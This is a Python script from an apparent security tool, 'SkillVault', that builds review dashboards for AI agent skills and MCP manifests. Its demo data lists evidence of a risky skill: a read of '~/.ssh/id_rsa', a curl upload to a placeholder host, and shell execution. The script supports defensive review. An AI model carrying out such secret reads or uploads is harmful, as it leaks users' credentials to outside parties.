#!/usr/bin/env python3
"""Generate SkillVault level3 dashboard data.

The script prefers an existing dashboard_data.json next to the input skill path.
If no compatible evidence file is present, it writes clearly labeled demo data.
"""

from __future__ import annotations

import argparse
import json
from datetime import datetime, timezone
from pathlib import Path
from typing import Any


REPO_ROOT = Path(__file__).resolve().parents[1]
DEFAULT_OUTPUT_ROOT = REPO_ROOT / "artifacts"
DEMO_SKILL_PATH = REPO_ROOT / "examples" / "demo-risky-skill"
WRITE_TOOL_HINTS = (
    "trigger",
    "unblock",
    "write",
    "create",
    "update",
    "delete",
    "cancel",
    "retry",
    "rebuild",
    "approve",
)


def demo_dashboard_data(skill_name: str) -> dict[str, Any]:
    return {
        "skill_name": skill_name,
        "analysis_mode": "demo",
        "data_source": "generated demo data",
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "level": "level3.1",
        "risk_score": 82,
        "risk_level": "HIGH",
        "confidence": 0.91,
        "reviewer_summary": {
            "verdict": "High risk demo skill",
            "summary": "The skill demonstrates sensitive file access, shell execution, and network behavior.",
            "manual_review_required": True,
            "suggested_decision": "Block or isolate before manual approval",
            "top_risks": [
                "Sensitive file access",
                "Shell execution",
                "Network connection attempt",
            ],
        },
        "suggested_decision": "Block or isolate before manual approval",
        "manual_review_required": True,
        "top_risks": [
            "Sensitive file access",
            "Shell execution",
            "Network connection attempt",
        ],
        "security_flags": {
            "sensitive_file_access": True,
            "shell_execution": True,
            "network_attempt": True,
            "prompt_injection_risk": False,
            "persistence_risk": False,
            "evasion_risk": False,
        },
        "summary_cards": [
            {
                "label": "Risk Score",
                "value": "82/100",
                "description": "Overall risk score calculated from static and dynamic evidence.",
            },
            {
                "label": "Risk Level",
                "value": "HIGH",
                "description": "The skill shows multiple suspicious behaviors.",
            },
            {
                "label": "Triggered Rules",
                "value": "7",
                "description": "Number of security rules matched.",
            },
            {
                "label": "Evidence Events",
                "value": "14",
                "description": "Number of evidence events collected.",
            },
        ],
        "risk_dimensions": {
            "static_risk": 70,
            "dynamic_risk": 85,
            "network_risk": 60,
            "secret_risk": 90,
            "persistence_risk": 50,
            "prompt_injection_risk": 40,
            "evasion_risk": 30,
        },
        "timeline_events": [
            {
                "timestamp": "00:00.000",
                "event_type": "start",
                "severity": "INFO",
                "message": "Skill execution started.",
                "evidence": "runner invoked demo-risky-skill",
            },
            {
                "timestamp": "00:00.218",
                "event_type": "file_access",
                "severity": "HIGH",
                "message": "Attempted to access a sensitive file.",
                "evidence": "open('~/.ssh/id_rsa')",
            },
            {
                "timestamp": "00:00.462",
                "event_type": "network",
                "severity": "MEDIUM",
                "message": "Attempted external network connection.",
                "evidence": "curl http://example.invalid/upload",
            },
            {
                "timestamp": "00:00.781",
                "event_type": "process",
                "severity": "HIGH",
                "message": "Spawned a shell command.",
                "evidence": "subprocess.run(..., shell=True)",
            },
            {
                "timestamp": "00:01.000",
                "event_type": "exit",
                "severity": "INFO",
                "message": "Skill execution finished.",
                "evidence": "exit_code=0",
            },
        ],
        "static_findings": [
            {
                "rule_id": "STATIC_SUBPROCESS_SHELL",
                "title": "Shell execution detected",
                "severity": "HIGH",
                "source": "static",
                "evidence": "subprocess.run(command, shell=True)",
                "explanation": "The skill contains code that can execute shell commands.",
                "recommendation": "Avoid shell=True and restrict command execution.",
            },
            {
                "rule_id": "STATIC_SECRET_PATH",
                "title": "Sensitive path reference",
                "severity": "HIGH",
                "source": "static",
                "evidence": "~/.ssh/id_rsa",
                "explanation": "The skill references a common SSH private key path.",
                "recommendation": "Block access to user secret paths during skill execution.",
            },
        ],
        "dynamic_findings": [
            {
                "rule_id": "DYNAMIC_SECRET_ACCESS",
                "title": "Sensitive file access attempt",
                "severity": "HIGH",
                "source": "dynamic",
                "evidence": "attempted read: ~/.ssh/id_rsa",
                "explanation": "The skill attempted to access a sensitive file during execution.",
                "recommendation": "Run skills in a sandbox with a restricted filesystem.",
            },
            {
                "rule_id": "DYNAMIC_NETWORK_ATTEMPT",
                "title": "Network connection attempt",
                "severity": "MEDIUM",
                "source": "dynamic",
                "evidence": "curl http://example.invalid/upload",
                "explanation": "The skill attempted to contact an external host.",
                "recommendation": "Disable network access by default unless explicitly required.",
            },
        ],
        "rule_findings": [
            {
                "rule_id": "STATIC_SUBPROCESS_SHELL",
                "title": "Shell execution detected",
                "severity": "HIGH",
                "source": "static",
                "evidence": "subprocess.run(command, shell=True)",
                "explanation": "Shell execution can allow command injection or unwanted system access.",
                "recommendation": "Replace shell execution with allowlisted commands.",
            },
            {
                "rule_id": "DYNAMIC_SECRET_ACCESS",
                "title": "Sensitive file access attempt",
                "severity": "HIGH",
                "source": "dynamic",
                "evidence": "attempted read: ~/.ssh/id_rsa",
                "explanation": "Access to private keys may lead to credential leakage.",
                "recommendation": "Deny access to SSH keys, API keys, token files, and environment secrets.",
            },
        ],
        "static_dynamic_comparison": [
            {
                "risk": "Shell execution",
                "static_detected": True,
                "dynamic_triggered": True,
                "conclusion": "High confidence",
            },
            {
                "risk": "Sensitive file access",
                "static_detected": True,
                "dynamic_triggered": True,
                "conclusion": "High confidence",
            },
            {
                "risk": "Network exfiltration",
                "static_detected": False,
                "dynamic_triggered": True,
                "conclusion": "Dynamic-only finding",
            },
        ],
        "recommendations": [
            "Block this skill until manual review is completed.",
            "Run only in a restricted sandbox.",
            "Disable network access by default.",
            "Deny access to SSH keys, .env files, token files, and credential stores.",
            "Require explicit approval before enabling shell execution.",
        ],
        "notes": [
            "This dashboard data is demo data for level3.1 security review visualization.",
            "Do not present this demo as a verified VM Mode C execution result.",
        ],
    }


def _relative_source(path: Path) -> str:
    try:
        return path.resolve().relative_to(REPO_ROOT).as_posix()
    except ValueError:
        return path.as_posix()


def _read_text_if_exists(path: Path) -> str:
    if not path.exists() or not path.is_file():
        return ""
    return path.read_text(encoding="utf-8", errors="replace")


def _load_mcp_json(skill_path: Path) -> dict[str, Any]:
    mcp_path = skill_path / "mcp.json"
    if not mcp_path.exists():
        return {}
    try:
        data = json.loads(mcp_path.read_text(encoding="utf-8"))
    except json.JSONDecodeError:
        return {}
    return data if isinstance(data, dict) else {}


def _first_mcp_server(mcp_data: dict[str, Any]) -> tuple[str, dict[str, Any]]:
    for name, config in mcp_data.items():
        if isinstance(config, dict):
            return name, config
    return "", {}


def _string_list(value: Any) -> list[str]:
    if isinstance(value, list):
        return [str(item) for item in value]
    return []


def _has_write_capable_tools(tools: list[str]) -> bool:
    return any(any(hint in tool.lower() for hint in WRITE_TOOL_HINTS) for tool in tools)


def real_static_dashboard_data(skill_path: Path, source_arg: str) -> dict[str, Any]:
    skill_name = skill_path.name
    skill_md_path = skill_path / "SKILL.md"
    mcp_json_path = skill_path / "mcp.json"
    skill_text = _read_text_if_exists(skill_md_path)
    mcp_text = _read_text_if_exists(mcp_json_path)
    mcp_data = _load_mcp_json(skill_path)
    server_name, server = _first_mcp_server(mcp_data)
    command = str(server.get("command", "")) if server else ""
    args = _string_list(server.get("args")) if server else []
    include_tools = _string_list(server.get("includeTools")) if server else []
    endpoint = next((arg for arg in args if arg.startswith(("http://", "https://"))), "")
    declared_command = " ".join([command, *args]).strip()
    remote_mcp = bool(endpoint or "mcp-remote" in args or "mcp-remote" in mcp_text)
    ci_cd_access = "buildkite" in (skill_text + "\n" + mcp_text).lower()
    write_capable = _has_write_capable_tools(include_tools)

    rule_findings: list[dict[str, Any]] = []
    if endpoint:
        rule_findings.append(
            {
                "rule_id": "REMOTE_MCP_ENDPOINT",
                "title": "Remote MCP endpoint declared",
                "severity": "MEDIUM",
                "source": "static",
                "evidence": endpoint,
                "explanation": "The skill declares a remote MCP endpoint.",
                "recommendation": "Review the remote MCP provider and required permissions before use.",
            }
        )
    if command == "npx" and ("mcp-remote" in args or "mcp-remote" in mcp_text):
        rule_findings.append(
            {
                "rule_id": "DECLARED_NPX_MCP_REMOTE",
                "title": "Declared npx mcp-remote bridge",
                "severity": "MEDIUM",
                "source": "static",
                "evidence": declared_command,
                "explanation": "The skill declares an external command used to launch a remote MCP bridge.",
                "recommendation": "Do not execute this command until the package source and permissions are reviewed.",
            }
        )
    if ci_cd_access and include_tools:
        rule_findings.append(
            {
                "rule_id": "CICD_METADATA_ACCESS",
                "title": "CI/CD metadata access",
                "severity": "MEDIUM",
                "source": "static",
                "evidence": ", ".join(include_tools),
                "explanation": "The skill can access Buildkite build and pipeline metadata through MCP tools.",
                "recommendation": "Use least-privilege credentials and avoid production tokens during testing.",
            }
        )

    timeline_events = [
        {
            "timestamp": "00:00.000",
            "event_type": "static_parse",
            "severity": "INFO",
            "message": "Loaded SKILL.md for static review.",
            "evidence": _relative_source(skill_md_path) if skill_md_path.exists() else "SKILL.md not found",
        },
        {
            "timestamp": "00:00.010",
            "event_type": "manifest_parse",
            "severity": "INFO",
            "message": "Loaded mcp.json for static review.",
            "evidence": _relative_source(mcp_json_path) if mcp_json_path.exists() else "mcp.json not found",
        },
    ]
    if endpoint:
        timeline_events.append(
            {
                "timestamp": "00:00.020",
                "event_type": "mcp_endpoint",
                "severity": "MEDIUM",
                "message": "Detected remote MCP endpoint declaration.",
                "evidence": endpoint,
            }
        )
    if include_tools:
        timeline_events.append(
            {
                "timestamp": "00:00.030",
                "event_type": "tool_inventory",
                "severity": "MEDIUM",
                "message": "Detected declared MCP tools.",
                "evidence": ", ".join(include_tools),
            }
        )
    timeline_events.append(
        {
            "timestamp": "00:00.040",
            "event_type": "review_complete",
            "severity": "INFO",
            "message": "Static review completed. No dynamic execution evidence was collected.",
            "evidence": "static-only review; no command execution performed",
        }
    )

    risk_score = 52 if not write_capable else 64
    risk_level = "MEDIUM"
    confidence = 0.68 if not write_capable else 0.72
    source = _relative_source(skill_path) if Path(source_arg).is_absolute() else source_arg.rstrip("/")
    summary = (
        "This skill declares a remote Buildkite MCP connection through npx mcp-remote. "
        "The listed tools appear read-oriented, but the skill still depends on an external MCP endpoint "
        "and may expose CI/CD metadata if authorized."
    )
    return {
        "skill_name": skill_name,
        "analysis_mode": "real_static",
        "data_source": source,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "level": "level3.1",
        "risk_score": risk_score,
        "risk_level": risk_level,
        "confidence": confidence,
        "reviewer_summary": {
            "verdict": "Medium risk real static finding",
            "summary": summary,
            "manual_review_required": True,
            "suggested_decision": "Require manual review before use",
            "top_risks": [
                "Remote MCP endpoint",
                "External command declaration",
                "CI/CD metadata access",
            ],
        },
        "suggested_decision": "Require manual review before use",
        "manual_review_required": True,
        "top_risks": [
            "Remote MCP endpoint",
            "External command declaration",
            "CI/CD metadata access",
        ],
        "security_flags": {
            "sensitive_file_access": False,
            "shell_execution": False,
            "network_attempt": remote_mcp,
            "remote_mcp": remote_mcp,
            "ci_cd_access": ci_cd_access,
            "write_capable_tools": write_capable,
            "prompt_injection_risk": False,
            "persistence_risk": False,
            "evasion_risk": False,
        },
        "summary_cards": [
            {
                "label": "Risk Score",
                "value": f"{risk_score}/100",
                "description": "Static review score based on manifest and skill text.",
            },
            {
                "label": "Risk Level",
                "value": risk_level,
                "description": "Static review risk level for this skill.",
            },
            {
                "label": "Triggered Rules",
                "value": str(len(rule_findings)),
                "description": "Number of static review rules matched.",
            },
            {
                "label": "Evidence Events",
                "value": str(len(timeline_events)),
                "description": "Number of static review events collected.",
            },
        ],
        "risk_dimensions": {
            "static_risk": 58,
            "dynamic_risk": 0,
            "network_risk": 62 if remote_mcp else 0,
            "secret_risk": 20 if ci_cd_access else 0,
            "persistence_risk": 0,
            "prompt_injection_risk": 10,
            "evasion_risk": 15 if command == "npx" else 0,
        },
        "timeline_events": timeline_events,
        "static_findings": rule_findings,
        "dynamic_findings": [],
        "rule_findings": rule_findings,
        "static_dynamic_comparison": [
            {
                "risk": "Remote MCP endpoint",
                "static_detected": remote_mcp,
                "dynamic_triggered": False,
                "conclusion": "Static-only finding; dynamic execution not performed",
            },
            {
                "risk": "CI/CD metadata access",
                "static_detected": ci_cd_access,
                "dynamic_triggered": False,
                "conclusion": "Static-only finding; review required before authorization",
            },
            {
                "risk": "Write-capable MCP tools",
                "static_detected": write_capable,
                "dynamic_triggered": False,
                "conclusion": "Not detected in declared tool allowlist" if not write_capable else "Static-only finding; review required",
            },
        ],
        "recommendations": [
            "Require manual review before use.",
            "Do not execute the declared npx mcp-remote command until the package source and permissions are reviewed.",
            "Use least-privilege Buildkite credentials and avoid production tokens during testing.",
            "Keep this skill in static-only review until dynamic execution is explicitly approved in a sandbox.",
        ],
        "notes": [
            "Real static review only; no dynamic execution evidence was collected.",
            "The declared MCP command was not executed by this generator.",
        ],
        "mcp_server": server_name,
        "declared_command": declared_command,
        "declared_tools": include_tools,
    }


def ensure_demo_skill(skill_path: Path) -> None:
    skill_path.mkdir(parents=True, exist_ok=True)
    readme = skill_path / "README.md"
    if not readme.exists():
        readme.write_text(
            "# demo-risky-skill\n\n"
            "Safe demo fixture for SkillVault level3 visualization. "
            "This directory contains no executable malicious code; dashboard evidence is synthetic demo data.\n",
            encoding="utf-8",
        )


def load_existing_dashboard_data(skill_path: Path) -> dict[str, Any] | None:
    candidate = skill_path / "dashboard_data.json"
    if not candidate.exists():
        return None
    try:
        data = json.loads(candidate.read_text(encoding="utf-8"))
    except json.JSONDecodeError:
        return None
    if not isinstance(data, dict):
        return None
    data.setdefault("analysis_mode", "imported")
    data.setdefault("level", "level3.1")
    data.setdefault("generated_at", datetime.now(timezone.utc).isoformat())
    data.setdefault("data_source", str(candidate))
    data.setdefault("notes", [])
    data["notes"].append("Imported dashboard data; verify provenance before presenting it as runtime evidence.")
    return data


def generate_dashboard_data(skill_arg: str, output_root: Path = DEFAULT_OUTPUT_ROOT) -> Path:
    skill_path = Path(skill_arg)
    if not skill_path.is_absolute():
        skill_path = REPO_ROOT / skill_path
    skill_name = skill_path.name or "demo-risky-skill"

    is_demo = skill_path.resolve() == DEMO_SKILL_PATH.resolve()
    if is_demo:
        ensure_demo_skill(skill_path)
        data = load_existing_dashboard_data(skill_path) or demo_dashboard_data(skill_name)
    else:
        data = real_static_dashboard_data(skill_path, skill_arg)
    output_dir = output_root / skill_name
    output_dir.mkdir(parents=True, exist_ok=True)
    output_path = output_dir / "dashboard_data.json"
    output_path.write_text(json.dumps(data, indent=2, ensure_ascii=False), encoding="utf-8")
    return output_path


def main() -> int:
    parser = argparse.ArgumentParser(description="Generate SkillVault level3 dashboard data.")
    parser.add_argument("skill", nargs="?", default="examples/demo-risky-skill")
    parser.add_argument("--output-root", default=str(DEFAULT_OUTPUT_ROOT))
    args = parser.parse_args()

    output_path = generate_dashboard_data(args.skill, Path(args.output_root))
    print(f"Wrote dashboard data: {output_path}")
    print("Demo mode is used only for examples/demo-risky-skill; other skill directories use real_static review.")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
